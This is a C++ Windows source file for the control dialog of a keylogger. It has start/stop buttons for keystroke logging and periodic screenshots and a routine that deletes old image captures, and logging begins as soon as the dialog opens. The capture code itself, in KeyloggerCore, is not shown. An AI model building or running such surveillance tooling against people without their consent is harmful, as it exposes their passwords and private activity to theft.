#define UNICODE
#define _UNICODE
#include <windows.h>
#include "resource.h"
#include <string>
#include <sstream>
#include <filesystem>
#include "KeyloggerCore.h"

static KeyloggerCore keylogger;
static COLORREF logColor = RGB(0, 128, 0);
static COLORREF ssColor = RGB(0, 128, 0);
static std::wstring logText = L"Logging: OFF";
static std::wstring ssText = L"Screenshots: OFF";

// New: Button colors
static HBRUSH hLogBrush = NULL;
static HBRUSH hSSBrush = NULL;

INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void DeleteOldImages(int days);
void UpdateStatus(HWND hDlg);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_KEYLOGGER_DIALOG), NULL, DialogProc, 0);
    return 0;
}

void UpdateStatus(HWND hDlg)
{
    bool log = keylogger.isLogging();
    bool ss = keylogger.isScreenshots();
    logText = log ? L"Logging: ON" : L"Logging: OFF";
    ssText = ss ? L"Screenshots: ON" : L"Screenshots: OFF";
    logColor = log ? RGB(0, 128, 0) : RGB(200, 0, 0);
    ssColor = ss ? RGB(0, 128, 0) : RGB(200, 0, 0);
    // Update status labels (assume two static controls: IDC_LOG_STATUS_LABEL, IDC_SS_STATUS_LABEL)
    SetDlgItemText(hDlg, IDC_LOG_STATUS_LABEL, logText.c_str());
    SetDlgItemText(hDlg, IDC_SS_STATUS_LABEL, ssText.c_str());
    // Update button text with status in brackets
    std::wstring logBtn = log ? L"Stop Logging [ON]" : L"Start Logging [OFF]";
    std::wstring ssBtn = ss ? L"Stop Screenshots [ON]" : L"Start Screenshots [OFF]";
    SetDlgItemText(hDlg, IDC_LOG_BTN, logBtn.c_str());
    SetDlgItemText(hDlg, IDC_SCREENSHOT_BTN, ssBtn.c_str());
    // Update button brushes
    if (hLogBrush)
        DeleteObject(hLogBrush);
    if (hSSBrush)
        DeleteObject(hSSBrush);
    hLogBrush = CreateSolidBrush(logColor);
    hSSBrush = CreateSolidBrush(ssColor);
}

INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_INITDIALOG:
        SetDlgItemInt(hDlg, IDC_DAYS_EDIT, 2, FALSE);
        UpdateStatus(hDlg);
        keylogger.start();
        return TRUE;
    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
        case IDC_DELETE_BTN:
        {
            int days = GetDlgItemInt(hDlg, IDC_DAYS_EDIT, NULL, FALSE);
            DeleteOldImages(days);
            SetDlgItemText(hDlg, IDC_LOG_STATUS_LABEL, L"Old images deleted.");
            SetDlgItemText(hDlg, IDC_SS_STATUS_LABEL, L"");
            break;
        }
        case IDC_LOG_BTN:
            keylogger.setLogging(!keylogger.isLogging());
            UpdateStatus(hDlg);
            break;
        case IDC_SCREENSHOT_BTN:
            keylogger.setScreenshots(!keylogger.isScreenshots());
            UpdateStatus(hDlg);
            break;
        }
        break;
    case WM_CTLCOLORSTATIC:
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_LOG_STATUS_LABEL))
        {
            HDC hdcStatic = (HDC)wParam;
            SetBkMode(hdcStatic, TRANSPARENT);
            SetTextColor(hdcStatic, logColor);
            static HBRUSH hBrush = NULL;
            if (!hBrush)
                hBrush = CreateSolidBrush(GetSysColor(COLOR_3DFACE));
            return (INT_PTR)hBrush;
        }
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_SS_STATUS_LABEL))
        {
            HDC hdcStatic = (HDC)wParam;
            SetBkMode(hdcStatic, TRANSPARENT);
            SetTextColor(hdcStatic, ssColor);
            static HBRUSH hBrush = NULL;
            if (!hBrush)
                hBrush = CreateSolidBrush(GetSysColor(COLOR_3DFACE));
            return (INT_PTR)hBrush;
        }
        break;
    case WM_CTLCOLORBTN:
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_LOG_BTN))
        {
            return (INT_PTR)hLogBrush;
        }
        if ((HWND)lParam == GetDlgItem(hDlg, IDC_SCREENSHOT_BTN))
        {
            return (INT_PTR)hSSBrush;
        }
        break;
    case WM_CLOSE:
        keylogger.stop();
        if (hLogBrush)
            DeleteObject(hLogBrush);
        if (hSSBrush)
            DeleteObject(hSSBrush);
        EndDialog(hDlg, 0);
        break;
    }
    return FALSE;
}

void DeleteOldImages(int days)
{
    std::time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    if (std::filesystem::exists("./images") && std::filesystem::is_directory("./images"))
    {
        for (const auto &entry : std::filesystem::directory_iterator("./images"))
        {
            const auto modifiedTime = std::filesystem::last_write_time(entry);
            const auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                modifiedTime - std::filesystem::file_time_type::clock::now() + std::chrono::system_clock::now());
            const auto modifiedTime_t = std::chrono::system_clock::to_time_t(sctp);
            double ageInDays = difftime(currentTime, modifiedTime_t) / (60 * 60 * 24);
            if (ageInDays > days)
            {
                std::filesystem::remove(entry);
            }
        }
    }
}
